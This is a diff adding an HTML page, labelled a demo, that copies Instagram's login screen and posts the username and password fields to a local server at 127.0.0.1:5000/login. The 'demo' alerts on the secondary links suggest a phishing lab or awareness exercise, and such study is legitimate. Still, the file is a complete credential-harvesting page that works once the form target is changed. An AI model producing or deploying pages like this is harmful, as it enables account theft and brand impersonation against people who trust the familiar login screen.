@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Instagram Name Demo</title>
+
+  <!-- Pacifico font -->
+  <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
+
+  <style>
+    :root {
+      --bg:#fafafa;
+      --card-bg:#fff;
+      --muted:#8e8e8e;
+      --accent:#3897f0;
+      --input-border:#dbdbdb;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+    }
+    * { box-sizing: border-box }
+    body {
+      margin: 0;
+      background: var(--bg);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      color: #262626;
+    }
+    .wrap {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 10px;
+    }
+    .card {
+      width: 350px;
+      background: var(--card-bg);
+      border: 1px solid var(--input-border);
+      border-radius: 4px;
+      text-align: center;
+      padding: 22px;
+    }
+    .instagram-text {
+      font-family: 'Pacifico', cursive;
+      font-size: 50px; /* slightly smaller */
+      color: black;
+      margin-bottom: 20px;
+      letter-spacing: 0.6px;
+      font-weight: 400; /* lighter appearance */
+      text-shadow: 0 0 0.3px rgba(0,0,0,0.3); /* softens edges */
+    }
+    form { display: flex; flex-direction: column; gap: 8px; }
+    input[type="text"], input[type="password"] {
+      padding: 9px 10px;
+      border: 1px solid var(--input-border);
+      border-radius: 3px;
+      background: #fafafa;
+      font-size: 14px;
+    }
+    button.login {
+      background: var(--accent);
+      color: #fff;
+      border: none;
+      padding: 8px 10px;
+      border-radius: 4px;
+      font-weight: 600;
+      cursor: pointer;
+      margin-top: 4px;
+    }
+    .or {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      color: var(--muted);
+      font-size: 13px;
+      margin: 10px 0;
+    }
+    .or::before, .or::after {
+      content: "";
+      flex: 1;
+      height: 1px;
+      background: #dbdbdb;
+    }
+    .fb {
+      color: #385185;
+      font-weight: 600;
+      font-size: 14px;
+      text-decoration: none;
+      display: inline-flex;
+      gap: 8px;
+      align-items: center;
+      justify-content: center;
+    }
+    .small { 
+      color: var(--muted);
+      font-size: 12px;
+      margin-top: 14px;
+      line-height: 1.4;
+    }
+    @media (max-width: 500px) {
+      .card { width: 92vw; }
+    }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+
+    <!-- Login card -->
+    <div class="card" role="region" aria-label="Login">
+      <div class="instagram-text">Instagram</div>
+
+      <form id="loginForm" autocomplete="on" action="http://127.0.0.1:5000/login" method="post">
+        <input type="text" id="username" name="username" placeholder="Phone number, username or email" required>
+        <input type="password" id="password" name="password" placeholder="Password" required>
+        <button type="submit" class="login">Log In</button>
+      </form>
+
+      <div class="or"><span>OR</span></div>
+
+      <a class="fb" href="#" onclick="alert('This demo does not connect to Facebook'); return false;">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="#385185" xmlns="http://www.w3.org/2000/svg" aria-hidden="true"><path d="M22 12a10 10 0 1 0-11.5 9.9v-7h-2.2v-2.9h2.2V9.2c0-2.2 1.3-3.4 3.3-3.4.96 0 1.97.17 1.97.17v2.2h-1.12c-1.1 0-1.44.68-1.44 1.38v1.65h2.45l-.39 2.9h-2.06v7A10 10 0 0 0 22 12z"/></svg>
+        Log in with Facebook
+      </a>
+
+      <div class="small">
+        <a href="#" onclick="alert('Demo: password-reset not implemented'); return false;">Forgot password?</a>
+      </div>
+    </div>
+
+    <!-- Sign up card -->
+    <div class="card" style="padding: 16px;">
+      <div>Don't have an account? <a href="#" onclick="alert('Demo: signup not implemented'); return false;">Sign up</a></div>
+    </div>
+
+  </div>
+</body>
+</html>
